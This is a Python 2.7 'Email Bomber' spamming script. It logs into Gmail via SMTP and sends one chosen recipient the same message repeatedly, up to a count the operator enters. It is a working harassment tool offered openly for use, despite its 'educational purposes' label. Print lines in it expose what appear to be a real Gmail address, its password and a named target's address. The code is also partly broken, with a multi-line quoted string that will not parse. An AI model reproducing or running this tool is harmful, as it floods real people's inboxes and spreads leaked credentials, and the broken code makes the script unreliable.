#!/usr/bin/python 2.7
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!



import os
import smtplib
import getpass
import sys
import time

print '                                                                    '
print '                                                                    '
print '            #################################################       '
print '            #                                               #       '
print '            #        Email Bomber ( Spamming Tool )         #       '
print '            #                                               #       '
print '            #                  Version 2.0                  #       '
print '            #                                               #       '
print '            #           Modified by : Mohin Paramasivam     #       '
print '            #                                               #       '
print '            #       Only for Educational Purposes !!        #       '
print '            #                                               #       '
print '            #################################################       '

print '                                                                   '


print '                                           '

print '    '
email = raw_input('Attacker Gmail Address : ')
print '   jaymoneydough7@gmail.com          '
user = raw_input('Anonymous name : ')
print '   Richard   '
passwd = getpass.getpass('Password: ')

print 'Jordun23   '

to = raw_input('\nTo: ')


print ' rinapatel@gmail.com   '

body = raw_input('Message: ')

print ' Inspirational Quotes About Life
Keep smiling, because life is a beautiful thing and there's so much to smile about. - ...
Life is a long lesson in humility. - ...
In three words I can sum up everything I've learned about life: it goes on. - ...
Love the life you live. ...
Life is either a daring adventure or nothing at all. -   '

total = input('Number of send: ')

smtp_server = 'smtp.gmail.com'
port = 587


print '150'

try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    server.starttls()
    server.login(email,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email,to,msg)
        print "\rE-mails sent: %i" % i
        time.sleep(1)
        sys.stdout.flush()
    server.quit()
    print '\n Done !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
    sys.exit()
